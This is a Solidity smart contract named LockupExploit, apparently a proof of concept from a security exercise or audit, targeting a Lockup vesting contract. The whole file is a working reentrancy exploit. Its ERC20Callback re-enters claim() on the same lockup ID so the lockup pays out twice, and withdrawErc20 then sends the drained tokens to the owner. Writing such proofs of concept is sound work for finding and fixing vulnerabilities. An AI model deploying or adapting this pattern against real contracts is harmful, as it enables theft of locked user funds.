// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console} from "forge-std/Script.sol";
import {Lockup} from "../src/Lockup.sol";
import {ICallbackRecipient} from "../src/interfaces/ICallbackRecipient.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {CallbackToken} from "./fixtures/CallbackToken.sol";

contract LockupExploit is ICallbackRecipient, Ownable {
    Lockup lockup;
    CallbackToken callbackToken;
    uint256 lockupId;

    bool alreadyCalled;


    constructor(address _owner) Ownable(_owner) {}

    function runExploit(
        address _callbackTokenAddr,
        address _lockupAddr,
        uint256 _lockupId
    ) public onlyOwner {
        callbackToken = CallbackToken(_callbackTokenAddr);
        lockup = Lockup(_lockupAddr);
        lockupId = _lockupId;

        // Sanity check: Ensure the lockup ID belongs to this contract
        (, , address recipient, , ) = lockup.lockups(lockupId);
        require(
            recipient == address(this),
            "Lockup ID does not belong to this contract"
        );

        claim(lockupId);

        // Reset the lockup and callback token
        lockup = Lockup(address(0));
        callbackToken = CallbackToken(address(0));
        lockupId = 0;
    }

    function claim(uint256 _lockupId) internal {
        uint256[] memory ids = new uint256[](1);
        ids[0] = _lockupId;
        lockup.claim(ids);
    }

    function withdrawErc20(address _token, uint256 _amount) public onlyOwner {
        IERC20(_token).transfer(owner(), _amount);
    }

    function ERC20Callback(address from, uint256 value) external override {
        if (alreadyCalled) {
            return;
        }
        alreadyCalled = true;
        require(msg.sender == address(callbackToken), "Invalid callback");

        // Sanity check: Ensure there's sufficient balance to exploit
        uint256 remainingBalance = callbackToken.balanceOf(address(lockup));
        (, , , , uint256 lockupAmount) = lockup.lockups(lockupId);
        require(
            remainingBalance >= lockupAmount,
            "Insufficient balance to exploit"
        );

        claim(lockupId);
        alreadyCalled = false;
    }
}
